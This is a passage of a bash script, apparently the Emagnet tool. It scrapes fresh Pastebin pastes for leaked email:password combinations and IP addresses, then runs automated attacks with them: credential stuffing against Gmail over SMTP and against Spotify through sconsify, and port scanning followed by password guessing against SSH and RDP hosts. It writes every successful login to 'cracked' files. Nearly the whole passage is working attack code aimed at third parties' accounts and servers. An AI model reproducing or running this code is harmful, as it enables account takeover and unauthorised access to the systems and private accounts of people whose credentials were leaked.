        echo -e "You must set a password to use during the attack"
        read -p "Enter a password or hit enter for default (Default: qwerty) " rdppassb
        echo ""
        if [[ -n "$rdppassb" ]]; then
            sed -i '199d' ${EMAGNET_CONF}
            sed -i "199 i rdppassb=$rdppassb" ${EMAGNET_CONF}
        else
            sed -i '199d' ${EMAGNET_CONF}
            sed -i "199 i RDPPASS=qwerty" ${EMAGNET_CONF}
        fi
    fi

    SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*"
    grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" |
        awk -F':' '{print $2}' |
        sort |
        awk -F, '!seen[$1]++' >"$RDPPORTSCAN"

    if [[ $(cat $RDPPORTSCAN | wc -l) -lt "1" ]]; then
        echo -e "                       - IPv4 Addresses Found \r             [\e[1;31m00\e[0m] "
        sleep 2
    else
        echo -e "                       - IPv4 Addresses Found \r             [\e[1;32m$(cat $RDPPORTSCAN | wc -l)\e[0m] "
        sleep 2
        xargs -i -P $THREADS timeout 0.5 nc -zvn {} $EDPPORT <$RDPPORTSCAN 2>&1 | awk '{print $3} /succeeded/ ' | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' >$RDPTARGETS
        echo -e "                       - Has Port $rdpPORT Open\r             [\e[1;32m$(cat $RDPPORTSCAN | wc -l)\e[0m] "
        printf "\n%64s\n" | tr ' ' '='
        printf "\n%15s"
        printf "BRUTE FORCING \e[1;31mRDP\e[0m TARGETS\e[0m\n\n"
        sleep 2
        while read line; do
            #timeout 0.5
            xfreerdp --ignore-certificate --authonly -u $RDP_USERNAME -p $RDP_PASSWORD $line &>test
            cat test | grep -q "ERRCONNECT_SECURITY_NEGO_CONNECT_FAILED"
            if [[ $? != "0" ]]; then
                echo -e "[\e[1;32m>>\e[0m] - Cracked Password: $line"
            else
                echo -e "[\e[1;31m<<\e[0m] - Wrong Login: $line"
            fi
            sleep 4
        done <$RDPTARGETS
    fi
    sleep 4
}

emagnet_sshbruter() {
    if [[ -z "$SSHPASS" ]]; then
        echo -e "You must set a password to use during the attack"
        read -p "Enter a password or hit enter for default (Default: root) " sshpassb
        if [[ -n "$sshpassb" ]]; then
            sed -i "s/SSHPASS=/SSHPASS=$sshpassb" ${EMAGNET_CONF}
        fi
    fi

    SKIPLIST="^0.*\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*\|^0\.\|^1\.\|^2\.\|^3\.\|^4\.\|^5\.\|^6\.\|^7\.\|^8\.\|^10."
    grep -E -ra -o '([0-9]{1,3}[\.]){3}[0-9]{1,3}' $EMAGNET | cut -d: -f2 | grep -v '^0.*\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*\|^0.\|^1\.\|^2\.\|^3\.\|^4\.\|^5\.\|^6\.\|^7\.\|^8\.\|^9\.\|\\' | awk '!seen[$0]++' >${SSHPORTSCAN}
    SSHPORTSCAN_TARGETS="$(cat ${SSHPORTSCAN} | wc -l)"

    if [[ ${SSHPORTSCAN_TARGETS} = "0" ]]; then
        echo -e "                       - IPv4 Addresses Found \r            [\e[1;32m00\e[0m]"
    else
        echo -e "                       - IPv4 Addresses Found \r             [\e[1;32m$SSHPORTSCAN_TARGETS\e[0m] "
        xargs -i -P $THREADS timeout 0.5 nc -zvn {} ${SSHPORT} <${SSHPORTSCAN} 2>&1 | grep 'succeeded' | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' >${SSHTARGETS}
        echo -e "                       - IPv4 Addresses Port $SSHPORT Open\r             [\e[1;32m$(cat ${SSHTARGETS} | wc -l)\e[0m] "
        sleep 2
        printf "\n%64s\n" | tr ' ' '='
        printf "\n%16s"
        printf "BRUTE FORCING -- \e[1;34mSSH\e[0m TARGETS\e[0m\n\n"
        sleep 1

        while read line; do
            sshpass -p ${SSHPASS} ssh -o "StrictHostKeyChecking=no" ${SSHUSER}@${line} -p ${SSHPORT} "date;exit" &>/dev/null
            if [[ "$?" = "0" ]]; then
                echo -e "[\e[1;32m>>\e[0m] - Cracked: $SSHUSER:$SSHPASS@$line"
                echo -e "${SSHUSER}:${SSHPASS}@${line}" >>$EMAGNETCRACKED/cracked-spotify-passwords.txt
            else
                echo -e "[\e[1;31m<<\e[0m] - Wrong pass for: ${SSHUSER}@${line}"
            fi
        done <${SSHTARGETS}
        sleep 1
    fi
    sleep 4

    rm ${SSHPORTSCAN_TARGETS}
}

emagnet_spotify_bruter() {
    SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" |
        awk '{print $1}' |
        cut -d':' -f2,3 |
        cut -d'|' -f1 |
        uniq | grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\' | grep -v "/" >>"$SPOTIFY_TARGETS"
    while read line; do
        SPOTIFY_USER="$(echo $line | cut -d: -f1)"
        SPOTIFY_PASS="$(echo $line | cut -d: -f2)"
        ./sconsify -username="${SPOTIFY_USER}" <<<"${SPOTIFY_PASS}" 2>/dev/null | grep -i -q "bad"
        if [[ "$?" -eq "0" ]]; then
            echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
        else
            echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
            echo -e "================================================================" >>"$EMAGNETCRACKED/cracked-spotify-passwords.txt"
            echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)" >>"$EMAGNETCRACKED/cracked-spotify-passwords.txt"
            echo -e "[+]------------------------------------------------------------" >>"$EMAGNETCRACKED/cracked-spotify-passwords.txt"
            echo -e "[+] Username: ${SPOTIFY_USER}" >>"$EMAGNETCRACKED/cracked-spotify-passwords.txt"
            echo -e "[+] Password: ${SPOTIFY_PASS}" >>"$EMAGNETCRACKED/cracked-spotify-passwords.txt"
            echo -e "================================================================\n\n" >>"$EMAGNETCRACKED/cracked-spotify-passwords.txt"
            echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >>"$HOME/.config/emagnet/tmp/.emagnet-cracked"
            echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >>"$HOME/.config/emagnet/tmp/.emagnet-failed"
        fi
    done <"$SPOTIFY_TARGETS"

}

emagnet_gmail_bruter() {
    if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP |
        grep '\S' |
        sed 's/|/:/g' |
        awk '{print $1}' |
        cut -d: -f2,3 |
        uniq | grep -v '"'\|','\|'<' | grep -i gmail.com | wc -l) -gt "0" ]]; then

        grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" |
            awk '{print $1}' |
            cut -d: -f2,3 |
            uniq |
            grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\' |
            grep -v '/' |
            grep -i 'gmail.com' \
                >>$HOME/.config/emagnet/tmp/.emagnet-passwords.txt

        while read -r line; do
            GMAIL_ATTACK=$(curl -sL -u $(line) smtps://smtp.gmail.com:465/ -v 2>&1 |
                grep -qo "Application-specific")

            GMAIL_USER="$(echo $line | cut -d: -f1)"
            GMAIL_PASS="$(echo $line | cut -d: -f2)"

            if [[ -z "$GMAIL_ATTACK" ]]; then
                echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${GMAIL_USER}:${GMAIL_PASS}"
            fi

            if [[ -n "$GMAIL_ATTACK" ]]; then
                echo -e "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
                read -p "[+] Accounts to crack has been set to 1, emagnet has been killed.\n" hey
                echo -e "================================================================" >>"$EMAGNETCRACKED/cracked-gmail-passwords.txt"
                echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)" >>"$EMAGNETCRACKED/cracked-gmail-passwords.txt"
                echo -e "[+]------------------------------------------------------------" >>"$EMAGNETCRACKED/cracked-gmail-passwords.txt"
                echo -e "[+] Username: $mail" >>"$EMAGNETCRACKED/cracked-gmail-passwords.txt"
                echo -e "[+] Password: $password" >>"$EMAGNETCRACKED/cracked-gmail-passwords.txt"
                echo -e "================================================================\n\n" >>"$EMAGNETCRACKED/cracked-gmail-passwords.txt"
            fi
        done <"$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
        rm "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt" &>/dev/null
        sleep 3
    else
        sleep 1
    fi
}

emagnet_main() {

    if [[ $PROXY = "true" ]]; then
        CURL="curl -x socks5h://$PROXYHOST:$PROXYPORT"
    else
        CURL="curl -s "
    fi

    exclude='signup\|login\|archive\|_\|pastebin$\|dmca$\|tools$\|contact$\|languages'
    curl -Ls "$PASTEBIN" | awk -F'href="/' '{print $2}' | cut -d'"' -f1 | awk 'length($0)>6 && length($0)<9' | sed 's/^/https:\/\/pastebin.com\/raw\//g' | grep -v $exclude >"$HOME/.config/emagnet/tmp/.emagnet-temp1"
    ls -1 "$EMAGNETALL" | sort | awk '!seen[$0]++' | sed 's/^/https:\/\/pastebin.com\/raw\//g' >"$HOME/.config/emagnet/tmp/.emagnet-temp2"
    grep -v -x -F -f "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emagnet/tmp/.emagnet-temp1" | awk -F, '!seen[$1]++' >$HOME/.config/emagnet/tmp/.emagnet-download

    if [[ $PROXY = "true" ]]; then
        curl -sL -x socks5h://$PROXYHOST:$PROXYPORT https://pastebin.com/ | grep -io "What can I do to" &>/dev/null
    else
        curl -sL https://pastebin.com/ | grep -io "What can I do to" &>/dev/null
    fi

    if [[ "$?" = "0" ]]; then
        while read line; do
            source "$HOME/.config/emagnet/emagnet.conf" &>/dev/null
            $CURL -sL "$line" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Cookie: __cfduid=d7d79b8cd36362aa95e3b90fcf3acc7491594533376; _ga=GA1.2.1884747867.1594742009; __gads=ID=38e8a6bea2852c12:T=1594734804:S=ALNI_MYI6CC_VHeBWyI_jkDdMgjO0Ny2zw; cf_clearance=dfb094f0ccac0b6649ebafa292bb81de7b37b94e-1594840687-0-1za25cfc5cze628b45azf578cfb9-250; _gid=GA1.2.423143590.1594877466' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' -H 'TE: Trailers' -o "$EMAGNETTEMP/$(echo -e $line | sed "s:..*/::")"
        done <"$HOME/.config/emagnet/tmp/.emagnet-download"
    else
        xargs -P "$(xargs --show-limits -s 1 2>&1 | grep -i "parallelism" | awk '{print $8}')" -n 1 \
            wget --no-check-certificate --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" <$HOME/.config/emagnet/tmp/.emagnet-download &>/dev/null
    fi
    tt="$(ls $EMAGNETTEMP | wc -l)"

    el=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP | cut -d: -f2 | tr ' ' '\n' | awk -F, '!seen[$1]++')
    et=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP | tr ' ' '\n' | wc -l)
    ef=$(grep -rEiEio "\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b" $EMAGNETTEMP | grep '\S' | sed 's/|/:/g' | awk '{print $1}' | cut -d: -f1 | uniq | grep -v '"'\|','\|'<' | tr ' ' '\n')
    pf=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP | grep '\S' | sed 's/|/:/g' | awk '{print $1}' | cut -d: -f1 | uniq | grep -v '"'\|','\|'<' | tr ' ' '\n')
    pl=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" "$EMAGNETTEMP" | awk '{print $1}' | cut -d':' -f2,3 | cut -d'|' -f1 | awk -F, '!seen[$1]++' | grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'\|'index.html'\|'alerts' | grep -v '/')
    pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP | awk '{print $1}' | cut -d: -f2,3 | uniq | grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\' | grep -v / | wc -l)

    emagnet_clear
    emagnet_banner
    emagnet_move_realtime

    if [[ "$pt" -gt "0" ]] && [[ "$et" -gt "0" ]]; then
        echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${pt} passwords from: $EMAGNETPW/${pf##*/}" | xargs >>"$EMAGNETLOGS/emagnet.log"
        echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${et} email addresses from: $EMAGNETDB/${ef##*/}" | xargs >>"$EMAGNETLOGS/emagnet.log"
        echo -e "${pl}" >>$EMAGNETLOGS/passwords-from-pastebin.txt
        echo -e "${el}" >>$EMAGNETLOGS/emails-from-pastebin.txt
        cp -rn ${ef} $EMAGNETDB/ &>/dev/null
        cp -rn ${pf} $EMAGNETPW/ &>/dev/null
        # We want to move everything AFTER we bruteforced ;)
        if [[ ${tt} -lt "10" ]]; then tt=0${tt}; fi
        if [[ ${et} -lt "10" ]]; then et=0${et}; fi
        if [[ ${pt} -lt "10" ]]; then pt=0${pt}; fi
        echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m]"
        echo -e "                       - Passwords Found \r             [\e[1;32m$pt\e[0m]"
        echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m]\n"
        sleep 2

        if [[ "$GBRUTEFORCE" = "true" ]]; then
            printf "%64s \n\n" | tr ' ' '='
            printf "%16s"
            printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mI\e[0;32mL\E[1;31m\e[0m") ACCOUNTS\e[0m\n\n"
            emagnet_gmail_bruter
        elif [[ "$SBRUTEFORCE" = "true" ]]; then
            printf "%64s \n\n" | tr ' ' '='
            printf "%16s"
            printf "BRUTE FORCING -- \e[1;34mSSH\e[0m ACCOUNTS\e[0m\n\n"
            emagnet_sshbruter
        elif [[ "$PBRUTEFORCE" = "true" ]]; then
            printf "%64s \n\n" | tr ' ' '='
            printf "%15s"
            printf "BRUTE FORCING -- \e[0;32mSPOTIFY\e[0m ACCOUNTS\e[0m\n\n"
            emagnet_spotify_bruter
        elif [[ "$IBRUTEFORCE" = "true" ]]; then
            printf "%64s \n\n" | tr ' ' '='
            printf "%14s"
            printf "BRUTE FORCING -- \e[0;33mINSTAGRAM\e[0m ACCOUNTS\e[0m\n\n"
            emagnet_instagrambruter
        elif [[ "$RBRUTEFORCE" = "true" ]]; then
            printf "%64s \n\n" | tr ' ' '='
            printf "%15s"
            printf "BRUTE FORCING -- \e[1;31mRDP\e[0m ACCOUNTS\e[0m\n\n"
            emagnet_rdpbruter
        else
            sleep 0
        fi

    elif [[ "$pt" = "0" ]] && [[ "$et" -gt "0" ]]; then
        echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: Found ${et} email addresses from: $EMAGNETDB/${ef##*/}" | xargs >>"$EMAGNETLOGS/emagnet.log"
        echo -e "${el}" >>$EMAGNETLOGS/emails-from-pastebin.txt
        cp -rn ${ef} $EMAGNETDB/ &>/dev/null
        if [[ ${tt} -lt "10" ]]; then tt=0${tt}; fi
        if [[ ${et} -lt "10" ]]; then et=0${et}; fi
        echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m] "
        echo -e "                       - Passwords Found \r             [\e[1;31m00\e[0m] "
        echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m] \n"
        sleep 2

    elif [[ "$pt" = "0" ]] && [[ "$et" = "0" ]] && [[ ${tt} = "0" ]]; then
        echo -e "[\e[1;31m<<\e[0m] - No new files could be downloaded...\n[\e[1;31m<<\e[0m] - You may want to raise time in emagnet.conf.."
        sleep 2
    else
        if [[ ${tt} -lt "10" ]]; then tt=0${tt}; fi
        echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m] "
        echo -e "                       - Passwords found \r             [\e[1;31m00\e[0m] "
        echo -e "                       - Email Addresses Found \r             [\e[1;31m00\e[0m] \n"
        sleep 2
    fi

    rm "$HOME/.config/emagnet/tmp/.emagnet-temp1" "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emagnet/tmp/.emagnet-temp3" &>/dev/null

}

emagnet_run4ever() {
    for (( ; ; )); do
        emagnet_conf
        emagnet_first_run
        emagnet_paths
        emagnet_iconnection
        emagnet_version
        emagnet_check_pastebin
        emagnet_clear
        emagnet_banner
        emagnet_analyzer
        emagnet_clear
        emagnet_banner
        emagnet_analyzing_message
        emagnet_main
    done
}

emagnet_first_run() {
    if ! [[ -f "$EMAGNET_CONF" ]]; then
        emagnet_conf
        emagnet_required_stuff
        emagnet_distro
        emagnet_required_tools
        emagnet_mustbefilled
        emagnet_paths
        emagnet_check_pastebin
        emagnet_conf
    fi
}

emagnet_stats() {
    FILES=$(find $EMAGNET -type f | grep -v ".txt\|.gif\|.sh$\|tar.gz$" &>/dev/null)
    if [[ "$FILES" -gt "0" ]]; then
        echo -e "$basename$0: internal error -- nothing downloaded, nothing to count, exiting..."
    else
        emagnet="stats"
        line='       '
        printf "[\e[1;32m%s\e[m] %s %s - Please wait" $emagnet "${line:${#emagnet}}"
        TOTAL_FILES=$(find $EMAGNET -type f | wc -l)
        TOTAL_MAIL_FILES=$(find $EMAGNET | grep -c -i "email-files")
        TOTAL_PASSWORD_FILES=$(find $EMAGNET | grep -c -i "password-files")
        TOTAL_MAIL_ADDRESSES=$(find $EMAGNET -type f -name emails-from-pastebin.txt | xargs cat | wc -l)
        TOTAL_MAIL_AND_PASSWORDS=$(find $EMAGNET -type f -name passwords-from-pastebin.txt | xargs cat | wc -l)
        printf ", done...\n"
        [[ $TOTAL_FILES = "0" ]] && TOTAL_FILES="0$TOTAL_MAIL_FILES"
        printf "[\e[1;32m%s\e[m] %s %s - Total files downloaded\n" $TOTAL_FILES "${line:${#TOTAL_FILES}}"

        [[ $TOTAL_MAIL_FILES = "0" ]] && TOTAL_MAIL_FILES="0$TOTAL_MAIL_FILES"
        printf "[\e[1;32m%s\e[m] %s %s - Total files that included at least one mail address\n" $TOTAL_MAIL_FILES "${line:${#TOTAL_MAIL_FILES}}"

        [[ $TOTAL_PASSWORD_FILES = "0" ]] && TOTAL_PASSWORD_FILES="0$TOTAL_PASSWORD_FILES"
        printf "[\e[1;32m%s\e[m] %s %s - Total files that included at least one combo: mail:password\n" $TOTAL_MAIL_FILES "${line:${#TOTAL_MAIL_FILES}}"

        [[ $TOTAL_MAIL_ADDRESSES = "0" ]] && TOTAL_MAIL_ADDRESSES="0$TOTAL_MAIL_ADDRESSES"
        printf "[\e[1;32m%s\e[m] %s %s - Total mail addresses found\n" $TOTAL_MAIL_ADDRESSES "${line:${#TOTAL_MAIL_ADDRESSES}}"

        [[ $TOTAL_MAIL_AND_PASSWORDS = "0" ]] && TOTAL_MAIL_AND_PASSWORDS="0$TOTAL_MAIL_AND_PASSWORDS"
        printf "[\e[1;32m%s\e[m] %s %s - Total mail login credenticals stored\n" $TOTAL_MAIL_AND_PASSWORDS "${line:${#TOTAL_MAIL_AND_PASSWORDS}}"

        FILES=$(find $EMAGNET -type f | grep -v ".txt\|.gif\|.sh$\|tar.gz$" &>/dev/null)
    fi
}

emagnet_distro() {
    if [[ -z ${DISTRO} ]]; then
        DISTRO=$(cat /etc/*release | head -n 1 | awk '{ print tolower($1) }' | cut -d= -f2)
        sed -i "s/DISTRO=/DISTRO=$DISTRO/g" ${EMAGNET_CONF}
    fi
}

case "${1}" in
"-a" | "-author" | "--author")
    emagnet_author
    ;;

"emagnet" | "-e" | "-emagnet" | "--emagnet")
    emagnet_conf
    emagnet_first_run
    emagnet_required_tools
    emagnet_distro
    emagnet_paths
    emagnet_conf
    sed -i 's/GBRUTEFORCE=true/GBRUTEFORCE=false/g' ${EMAGNET_CONF}
    sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' ${EMAGNET_CONF}
    sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' ${EMAGNET_CONF}
    sed -i 's/IBRUTEFORCE=true/IBRUTEFORCE=false/g' ${EMAGNET_CONF}
    sed -i 's/RBRUTEFORCE=true/RBRUTEFORCE=false/g' ${EMAGNET_CONF}
    emagnet_run4ever
    ;;

"-g" | "-bruteforce" | "--bruteforce")
    emagnet_conf
    emagnet_required_tools
    emagnet_iconnection
    emagnet_first_run
    sed -i 's/GBRUTEFORCE=true/GBRUTEFORCE=false/g' ${EMAGNET_CONF}
    sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' ${EMAGNET_CONF}
    sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' ${EMAGNET_CONF}
    sed -i 's/IBRUTEFORCE=true/IBRUTEFORCE=false/g' ${EMAGNET_CONF}
    sed -i 's/RBRUTEFORCE=true/RBRUTEFORCE=false/g' ${EMAGNET_CONF}

    if [[ "$2" = "gmail" ]]; then
        sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' ${EMAGNET_CONF}
        emagnet_conf
        if [[ "$GBRUTEFORCE" = "true" ]]; then
            emagnet_run4ever
            emagnet_gmail_bruter
            mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &>/dev/null
        fi

    elif [[ "$2" = "ssh" ]]; then
        hash ssh &>/dev/null
        [[ "$?" > "0" ]] && echo -e "$basename$0: internal error -- ssh package is required to be installed, exiting..." && exit 1
        hash sshpass &>/dev/null
        [[ $? > "0" ]] && echo -e "$basename$0: internal error -- sshpass package is required to be installed, exiting..." && exit 1
        sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' ${EMAGNET_CONF}
        emagnet_conf
        if [[ "$SBRUTEFORCE" = "true" ]]; then
            emagnet_run4ever
            emagnet_sshbruter
            mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &>/dev/null
        fi

    elif [[ "$2" = "instagram" ]]; then
        sed -i 's/IBRUTEFORCE=false/IBRUTEFORCE=true/g' ${EMAGNET_CONF}
        emagnet_conf
        if [[ "$IBRUTEFORCE" = "true" ]]; then
            emagnet_run4ever
            emagnet_instagrambruter
            mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &>/dev/null
        fi

    elif [[ "$2" = "rdp" ]]; then
        sed -i 's/RBRUTEFORCE=false/RBRUTEFORCE=true/g' ${EMAGNET_CONF}
        emagnet_conf
        if [[ "$RBRUTEFORCE" = "true" ]]; then
            emagnet_run4ever
            emagnet_rdpbruter
            mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &>/dev/null
        fi

    elif [[ "$2" = "spotify" ]]; then
        find /usr/include -name "portaudio.h" | xargs grep -v "port" &>/dev/null
        if [[ $? -ne 0 ]]; then
            echo -e "$basename$0: internal error -- \e[1;31mDebian\e[0m: Copy and paste: apt install -y libasound2-dev portaudio19-dev libportaudio2 libportaudiocpp0"
            echo -e "$basename$0: internal error -- \e[1;34mGentoo\e[0m: Copy and paste: emerge --ask media-libs/portaudio"

            echo -e "$basename$0: internal error -- portaudio is required to be installed, exiting..."
            exit 1
        fi

        source ${EMAGNET_CONF}
        if [[ -z ${LIBSPOTIFY} ]]; then
            find /usr/include -type d | grep 'libspotify' &>/dev/null
            if [[ "$?" -ne "0" ]]; then
                echo -e "
                    \e[1;33mNOTICE:\e[0m
                    -------------------------------------------
                    \e[1;32mlibspotify\e[0m is not installed on this system
                    and since it is deprecated it is removed from 
                    all current repositorys for all distros so you
                    you need to install it manually, see below:

                    \e[1;34mMANUALLY INSTALL:\e[0m
                    -------------------------------------------
                    wget https://raw.githubusercontent.com/mopidy/libspotify-deb/master/libspotify_12.1.51.orig-amd64.tar.gz -P /tmp/
                    tar -xvf /tmp/\e[1;32mlibspotify\e[0m_12.1.51.orig-amd64.tar.gz -C /tmp
                    cd /tmp/\e[1;32mlibspotify\e[0m-12.1.51-Linux-x86_64-release/ && make install prefix=/usr/local

                    \e[1;31mALSA Development Kit Requirements:\e[0m
                    -------------------------------------------
                    If you don't care or understand what this is about
                    then you probably just want type uppercase \e[4mYES\e[0m
                    to let me install \e[1;32mlibspotify\e[0m and get started :)\n
                        " | awk '{print substr($0,21)}' # because my vim config driving me crazy and this solves the problem for now with printing this nice, remove first 21 characters from the output

                read -p "Answer: " LIBSPOTIFY
                if [[ "$LIBSPOTIFY" = "YES" ]]; then
                    printf "%s" "Checking connection........"
                    emagnet_iconnection
                    ping -i "1" -c 1 google.com &>/dev/null
                    [[ "$?" -gt "0" ]] && echo -e "$basename$0: internal error -- this feature require a internet connection but you seems to be offline, exiting.."
                    printf "..ok\n"
                    sleep 1
                    printf "%s" "Downloading libspoify........"
                    wget -q https://raw.githubusercontent.com/mopidy/libspotify-deb/master/libspotify_12.1.51.orig-amd64.tar.gz -P /tmp/
                    printf "ok\n"
                    printf "%s" "Extracting libspoify..,......"
                    tar -xf /tmp/libspotify_12.1.51.orig-amd64.tar.gz -C /tmp
                    printf "ok\n"
                    printf "%s" "Installing libspotify........"
                    cd /tmp/libspotify-12.1.51-Linux-x86_64-release/ &>/dev/null
                    printf "ok\n" &
                    make install prefix=/usr/local &>/dev/null
                    printf "ok\n"
                    printf "%s" "Preparing emagnet.conf......."
                    emagnet_conf
                    sed -i 's/LIBSPOTIFY=/LIBSPOTIFY=true/g' ${EMAGNET_CONF}
                    printf "ok\n"
                    echo -e "\nAll done, will continue in 3 seconds!"
                    sleep 2
                else
                    echo "Can't continue until libspotify has been installed.."
                    echo "Exiting.."
                    exit 1
                    sed -i 's/LIBSPOTIFY=/LIBSPOTIFY=false/g' ${EMAGNET_CONF}
                fi
            fi
        else
            sed -i 's/LIBSPOTIFY=/LIBSPOTIFY=true/g' ${EMAGNET_CONF}
        fi
        hash unzip &>/dev/null
        if [[ "$?" -ne "0" ]]; then
            echo -e "$basename$0: internal error -- unzip is required to be installed for unzip sconsify ..."
            exit 1
        fi
        ./sconsify -version &>/dev/null
        if [[ "$?" -ne "0" ]]; then
            echo "Sconsify is required to be installed before we attacking targets.."
            read -p "Download and install sconsify (y/N): " installsconsify
            if [[ "$installsconsify" -eq "y" ]]; then
                echo -e "Hold on, downloading sconsify.."
                wget -q --user-agent="${USERAGENT}" "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
                echo -e "Unzipping sconsify into current dir.."
                unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
                chmod +x ./sconsify
                echo -e "Cleaning up..."
                rm "linux-x86_64-sconsify-0.6.0-next.zip"
                echo "All done, have fun!"
                sleep 2
            else
                echo -e "$basename$0: internal error -- sconsify is required to be installed.."
                exit 1
            fi
        fi
        sed -i 's/PBRUTEFORCE=false/PBRUTEFORCE=true/g' ${EMAGNET_CONF}
        emagnet_conf

        if [[ "$PBRUTEFORCE" = "true" ]]; then
            emagnet_clear
            emagnet_banner
            printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
            printf "\n%64s \n\n" | tr ' ' '='
            emagnet_run4ever
            printf "\n%64s \n\n" | tr ' ' '='
            emagnet_spotify_bruter
        fi
        mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &>/dev/null
    else
        printf "%s\n" "$basename$0: internal error -- not a valid option, try gmail, spotify or ssh"
        exit 1
    fi
    ;;
"-k" | "-kill" | "--kill")
    emagnet_kill
    ;;

"-i" | "--ip" | "-ip" | "ip")
    emagnet_required_tools
    emagnet_conf
    emagnet_iconnection
    [[ $PROXY = "true" ]] && CURL="curl -s -x socks5h://$PROXYHOST:$PROXYPORT " || CURL="curl -s "
    echo -e "IP: $($CURL -s https://nr1.nu/i/)"
    ;;

"-h" | "--help" | "-help" | "help")
    emagnet_usage
    ;;

"-l" | "-license" | "--license")
    emagnet_required_tools
    emagnet_iconnection
    emagnet_license
    ;;

"-m" | "-move" | "--move")
    emagnet_conf
    emagnet_move_files
    ;;

"-d" | "-stats" | "--stats")
    emagnet_conf &>/dev/null
    emagnet_stats
    ;;

"-q" | "-quiet" | "--quiet")
    emagnet_conf
    emagnet_screen
    ;;

"version" | "-version" | "--version" | "-V")
    emagnet_required_stuff
    emagnet_conf
    VERSION="$(cat ${EMAGNET_CONF} | grep "^VERSION" | cut -d'=' -f2)"
    printf "Emagnet Version: $VERSION\n"
    ;;

"-t" | "-time" | "--time")
    emagnet_required_stuff
    emagnet_conf
    if [[ -z "$2" ]]; then
        echo "emagnet: internal error -- time require a number to be used"
        exit 1
    fi
    re='^[0-9]+$'
    if ! [[ $2 =~ $re ]]; then
        echo -e "emagnet: internal error -- that's not a valid number" >&2
        exit 1
    fi
    sed -i '30d' ${EMAGNET_CONF}
